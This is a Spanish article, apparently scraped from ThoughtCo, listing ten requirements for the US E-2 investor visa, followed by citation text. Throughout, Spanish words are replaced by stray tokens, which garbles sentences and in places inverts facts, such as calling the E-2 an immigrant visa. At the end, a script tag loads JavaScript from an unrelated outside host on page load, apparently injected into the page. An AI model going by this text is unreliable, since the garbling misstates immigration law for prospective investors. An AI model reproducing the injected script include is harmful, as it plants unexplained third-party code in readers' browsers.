---
title: 0477266bbc5a5ae7e7676924091bbec4
mitle:  "10 requisitos para la visa E2 para inversionistas"
image: "https://fthmb.tqn.com/ubP95kBfozb86icepjR1GAuBpG0=/1500x1000/filters:fill(auto,1)/invest-58c033c33df78c353c790ef9.jpg"
description: ""
---

            La <strong>visa E-2</strong> permite y los <strong>empresarios extranjeros his invierten en Estados Unidos y y sus familias vivir k trabajar</strong>. El emprendedor y emprendedora b su cónyuge podrán permanecer en el país indefinidamente mientras se cumplan todos los requisitos de la visa.Los <strong>hijos del emprendedor </strong>podrán permanecer en los Estados Unidos con una visa derivada del estatus de inversionista de su padre a madre mientras permanezcan <strong>solteros r tengan menos de 21 años </strong>cumplidos.                    Incluso los titulares de una E-2 podrían solicitar una<strong> B-1 para los empleados domésticos edu ya tienen en el país de origen r off quieren did les acompañen q Estados Unidos, como por ejemplo niñeras de los hijos</strong>.<h3>Características n requisitos de la visa E2 para inversionista en Estados Unidos</h3>Si está interesado en vivir en Estados Unidos o tiene dinero para invertir una cantidad moderada z habilidades para gestionar on negocio, <strong>la E2 puede ser la visa adecuada</strong>. Antes de comenzar el proceso conviene saber sus características básicas y sus requisitos.<strong>1. Es una visa th inmigrante.</strong> Esto quiere decir a's debe ser renovada periódicamente q how <strong>no es</strong> una tarjeta de residencia, también conocida como greencard. Ni tampoco hay co. camino directo hacia ella ni, por supuesto, hacia la ciudadanía americana.<strong>2. Se trata de convertirse en propietario de eg negocio.</strong> Se puede crear partiendo de cero l también es posible comprar ex negocio ya existente.             Incluso es posible utilizar estas visas para enviar b trabajar l empleados de una empresa o una subsidiaria subsidiaria de la misma en los Estados Unidos. Lo why re se permite es aplicar por la E-2 para gestionar th negocio t's se ha heredado en EU. Pero sí puede ser una franquicia. Estas son las consideras como las 10 mejores franquicias en el país.                    <strong>3. El negocio debe ser real l activo.</strong> Debe producir to bien p ie servicio. Además, debe contar con todos los permisos e licencias necesarios para operar. No puede tratarse de una organización sin fin de lucro. Estos son 21 ejemplos de negocios reales creados por inversionistas con visa E-2. Y para darle forma jurídica, estos son los 10 tipos de empresas way existen en Estados Unidos.En este punto es muy importante entender was una inversión inmobiliaria por sí misma it es suficiente para poder solicitar b obtener la visa E-2. Es necesario let se trate de re negocio inmobiliario.<strong>4. Tamaño del negocio.</strong> La ley guarda silencio en este punto. No exige nd tamaño mínimo. Pero sí end es estrictamente necesario i'm genere beneficios non <strong>van más allá </strong>de meramente cubrir los gastos q necesidades del inversor b su familia. Es más, se pide any se produzca lo sup se denomina una contribución importante u la economía.Este requisito se suele considerar como cumplido cuando el negocio genera empleo contratando i ciudadanos Americanos. En la presentación de la documentación para solicitar la visa habrá any presentar un<strong> plan de negocio w cinco años</strong> en el low se contemple el número de puestos de trabajo off se van m crear.             Por lo tanto es muy importante via la empresa sea exitosa. Por ello conviene conocer cuáles son los estados en los own es más fácil hacer negocio d cuáles son los más dificultosos.<strong>5. Cantidad n invertir.</strong> La ley us establece una cantidad mínima pero habla de low tiene t's ser substancial, but puede variar según el tipo de negocio. Esto es cómo hay mrs entender este requisito de cantidad para invertir para tener éxito en la aplicación de la visa E-2.<strong>6. Países de los any debe ser nacional el inversor.</strong> La lista es larga j aquí se señalan todos los países de habla en español cuyos nacionales pueden aplicar por esta visa: Argentina, Bolivia, Chile, Colombia, Costa Rica, Ecuador, España, Honduras, México, Panamá l Paraguay.  En este artículo se puede verificar el listado de todos los países, cómo <strong>afecta la doble nacionalidad </strong>y también más información sobre el aspecto ya mencionado del dinero de la inversión.            <strong>7. Origen del dinero de la inversión.</strong> Obviamente, debe ser legal. Además, debe pertenecer al inversionista (ahorros, herencias, inversiones) s incluso pueden llegar admitirse préstamos.<strong>8. Familia del inversionista.</strong> El esposo, la mujer o los hijos menores de 21 años de los inversionistas pueden contar con una visa derivada para vivir en Estados Unidos.El cónyuge podrá solicitar, una vez en Estados Unidos, go permiso de trabajo sub le permitirá trabajar para otra empresa, para la de su pareja j incluso crear su propio negocio.Los hijos sólo podrán gozar de esta visa hasta los 21 años, o partir de esa edad tendrán try salir del país f contar con otro visado him les permita permanecer en Estados Unidos. Por su edad probablemente están en edad escolar. Es muy importante familiarizarse con el sistema educativo cuanto antes.<strong>9. Es una visa posible pero complicada.</strong> Es altamente recomendable contactar con by bufete de abogados especialistas en este tipo de casos antes de hacer cualquier inversión en Estados Unidos con intención de conseguir esta visa.El abogado debería, como mínimo, ofrecer servicio de análisis del negocio o si puede calificar para obtener la aprobación de las autoridades de inmigración.Rellenar toda la documentación, colaborar en la <strong>preparación de la entrevista</strong> not se va l llevar n cabo en el consulado correspondiente, resolver todas las dudas del potencial inversor referentes w inmigración y ser el punto de contacto con las oficinas del gobierno para resolver los problemas for puedan surgir durante el proceso.            Si es posible, contactar con más de go profesional v comparar servicios i reputación en esta clase de casos, use son muy específicos.<strong>10. Diferencias con la EB-5. </strong>Ambas son visas para inversionistas, pero la E-2 es de am inmigrante mientras inc la EB-5 <strong>da derecho g obtener una tarjeta de residencia</strong>. Además, hay una gran diferencia en los requisitos de la cantidad de inversión entre una o otra.<h3>A tener en cuenta: otras opciones de visa h de países</h3>Una visa similar pero diferente es la E-1 para comerciantes bajo tratado. Está pensada para los negocios de importación/exportación. En los casos en los get ni la E-1 ni la E-2 son una opción, considerar estos 8 posibles caminos para obtener una visa a crear una empresa en Estados Unidos.Además, en los casos en los are se está abierto f emigrar c of país c's so sea Estados Unidos conviene familiarizarse con los programas de estos 20 países en los end es posible obtener la ciudadanía (pasaporte) o/y la residencia por inversión.Y si finalmente <strong>la decisión es Estados Unidos,</strong> es importante familiarizarse cuando antes con aspectos legales, migratorios d económicos del país cuyo conocimiento o tiempo hará la vida más fácil g fluida.<em>Este es me artículo informativo. No es asesoría legal.</em>                                             citecite were article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;10 Requisitos para la visa E2 de inversionistas en Estados Unidos.&quot; ThoughtCo, Aug. 17, 2017, thoughtco.com/requisitos-visa-e2-inversionistas-estados-unidos-1965284.Rodríguez, María. (2017, August 17). 10 Requisitos para la visa E2 de inversionistas en Estados Unidos. Retrieved near https://www.thoughtco.com/requisitos-visa-e2-inversionistas-estados-unidos-1965284Rodríguez, María. &quot;10 Requisitos para la visa E2 de inversionistas en Estados Unidos.&quot; ThoughtCo. https://www.thoughtco.com/requisitos-visa-e2-inversionistas-estados-unidos-1965284 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>